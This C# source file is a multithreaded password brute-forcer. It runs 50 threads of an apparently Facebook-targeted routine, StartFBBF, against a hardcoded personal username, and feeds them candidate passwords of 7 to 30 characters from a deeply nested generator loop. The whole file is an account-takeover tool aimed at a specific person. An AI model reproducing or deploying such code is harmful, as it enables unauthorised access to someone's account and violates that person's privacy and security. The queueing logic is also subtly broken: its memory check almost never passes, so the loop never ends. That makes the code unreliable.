using System;
using System.Collections.Generic;
using System.Collections.Concurrent;
using System.Text;
using System.Threading;

namespace BLL
{
    public class Generate
    {
        #region properties

        private const int NUMERO_DE_TREADS = 50;
        private const string usuario = "gustavo.henrique.3382118";
        public int MaxLength { get { return 30; } }
        public int MinLength { get { return 7; } }
        public int QuantidadeTestada { get; set; }


        public static string ValidChars
        {
            get
            {
                return "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%&*()-+.;:, 1234567890";
            }
        }

        #endregion

        #region public methods

        
        public static void Start()
        {
            API.FilaPrincipal = new ConcurrentQueue<string>();
            string linha = String.Empty;
            List<Thread> listaThreads = new List<Thread>();

            API.User = usuario;
            int n = NUMERO_DE_TREADS;

            for (int i = 0; i < n; i++)
            {
                listaThreads.Add(new Thread(API.StartFBBF));
            }

            foreach (Thread t in listaThreads)
            {
                t.Start();
            }

            Thread th = new Thread(GeraWordListIterativo);

            listaThreads.Add(th);

            th.Start();
            Console.ReadKey();
        }

        #endregion

        #region private methods

        #region Recursão

        private void GeraWordListRecursivo(string prefix)
        {
            foreach (char c in ValidChars)
            {
                if (prefix.Length + 1 >= MinLength && prefix.Length + 1 <= MaxLength)
                {
                    API.FilaPrincipal.Enqueue(prefix + c);
                    QuantidadeTestada++;
                }
                if (prefix.Length < MaxLength)
                {
                    GeraWordListRecursivo(prefix + c);
                }
            }
        }

        #endregion

        #region Iterativo

        private static void GeraWordListIterativo()
        {
            #region loops;
            foreach (Char a in ValidChars)
                foreach (Char b in ValidChars)
                    foreach (Char c in ValidChars)
                        foreach (Char d in ValidChars)
                            foreach (Char e in ValidChars)
                                foreach (Char f in ValidChars)
                                    foreach (Char g in ValidChars)
                                    {
                                        TryEnqueue(a.ToString() + b + c + d + e + f + g);
                                        foreach (Char h in ValidChars)
                                        {
                                            TryEnqueue(a.ToString() + b + c + d + e + f + g + h);
                                            foreach (Char i in ValidChars)
                                            {
                                                TryEnqueue(a.ToString() + b + c + d + e + f + g + h + i);
                                                foreach (Char j in ValidChars)
                                                {
                                                    TryEnqueue(a.ToString() + b + c + d + e + f + g + h + i + j);
                                                    foreach (Char k in ValidChars)
                                                    {
                                                        TryEnqueue(a.ToString() + b + c + d + e + f + g + h + i + j + k);
                                                        foreach (Char l in ValidChars)
                                                        {
                                                            TryEnqueue(a.ToString() + b + c + d + e + f + g + h + i + j + k + l);
                                                            foreach (Char m in ValidChars)
                                                            {
                                                                TryEnqueue(a.ToString() + b + c + d + e + f + g + h + i + j + k + l + m);
                                                                foreach (Char n in ValidChars)
                                                                {
                                                                    TryEnqueue(a.ToString() + b + c + d + e + f + g + h + i + j + k + l + m + n);
                                                                    foreach (Char o in ValidChars)
                                                                    {
                                                                        TryEnqueue(a.ToString() + b + c + d + e + f + g + h + i + j + k + l + m + n + o);
                                                                        foreach (Char p in ValidChars)
                                                                        {
                                                                            TryEnqueue(a.ToString() + b + c + d + e + f + g + h + i + j + k + l + m + n + o + p);
                                                                            foreach (Char q in ValidChars)
                                                                            {
                                                                                TryEnqueue(a.ToString() + b + c + d + e + f + g + h + i + j + k + l + m + n + o + p + q);
                                                                                foreach (Char r in ValidChars)
                                                                                {
                                                                                    TryEnqueue(a.ToString() + b + c + d + e + f + g + h + i + j + k + l + m + n + o + p + q + r);
                                                                                    ;
                                                                                    foreach (Char s in ValidChars)
                                                                                    {
                                                                                        TryEnqueue(a.ToString() + b + c + d + e + f + g + h + i + j + k + l + m + n + o + p + q + r + s);
                                                                                        foreach (Char t in ValidChars)
                                                                                        {
                                                                                            TryEnqueue(a.ToString() + b + c + d + e + f + g + h + i + j + k + l + m + n + o + p + q + r + s + t);
                                                                                            foreach (Char u in ValidChars)
                                                                                            {
                                                                                                TryEnqueue(a.ToString() + b + c + d + e + f + g + h + i + j + k + l + m + n + o + p + q + r + s + t + u);
                                                                                                foreach (Char v in ValidChars)
                                                                                                {
                                                                                                    TryEnqueue(a.ToString() + b + c + d + e + f + g + h + i + j + k + l + m + n + o + p + q + r + s + t + u + v);
                                                                                                    foreach (Char x in ValidChars)
                                                                                                    {
                                                                                                        TryEnqueue(a.ToString() + b + c + d + e + f + g + h + i + j + k + l + m + n + o + p + q + r + s + t + u + v + x);
                                                                                                        foreach (Char z in ValidChars)
                                                                                                        {
                                                                                                            TryEnqueue(a.ToString() + b + c + d + e + f + g + h + i + j + k + l + m + n + o + p + q + r + s + t + u + v + x + z);
                                                                                                            foreach (Char a1 in ValidChars)
                                                                                                            {
                                                                                                                TryEnqueue(a.ToString() + b + c + d + e + f + g + h + i + j + k + l + m + n + o + p + q + r + s + t + u + v + x + z + a1);
                                                                                                                foreach (Char b1 in ValidChars)
                                                                                                                {
                                                                                                                    TryEnqueue(a.ToString() + b + c + d + e + f + g + h + i + j + k + l + m + n + o + p + q + r + s + t + u + v + x + z + a1 + b1);
                                                                                                                    foreach (Char c1 in ValidChars)
                                                                                                                    {
                                                                                                                        TryEnqueue(a.ToString() + b + c + d + e + f + g + h + i + j + k + l + m + n + o + p + q + r + s + t + u + v + x + z + a1 + b1 + c1);
                                                                                                                        foreach (Char d1 in ValidChars)
                                                                                                                        {
                                                                                                                            TryEnqueue(a.ToString() + b + c + d + e + f + g + h + i + j + k + l + m + n + o + p + q + r + s + t + u + v + x + z + a1 + b1 + c1 + d1);
                                                                                                                            foreach (Char e1 in ValidChars)
                                                                                                                            {
                                                                                                                                TryEnqueue(a.ToString() + b + c + d + e + f + g + h + i + j + k + l + m + n + o + p + q + r + s + t + u + v + x + z + a1 + b1 + c1 + d1 + e1);
                                                                                                                                foreach (Char f1 in ValidChars)
                                                                                                                                {
                                                                                                                                    TryEnqueue(a.ToString() + b + c + d + e + f + g + h + i + j + k + l + m + n + o + p + q + r + s + t + u + v + x + z + a1 + b1 + c1 + d1 + e1 + f1);
                                                                                                                                }
                                                                                                                            }
                                                                                                                        }
                                                                                                                    }
                                                                                                                }
                                                                                                            }
                                                                                                        }
                                                                                                    }
                                                                                                }
                                                                                            }
                                                                                        }
                                                                                    }
                                                                                }
                                                                            }
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
            #endregion
        }

        private static bool TryEnqueue(string aInserir)
        {
            bool inseriu = false;
            do
            {
                if (GC.GetTotalMemory(true) <= Encoding.UTF8.GetBytes(aInserir).Length)
                {
                    API.FilaPrincipal.Enqueue(aInserir);
                    inseriu = true;
                }
            } while (!inseriu);
            return true;
        }

        #endregion

        #endregion
    }
}
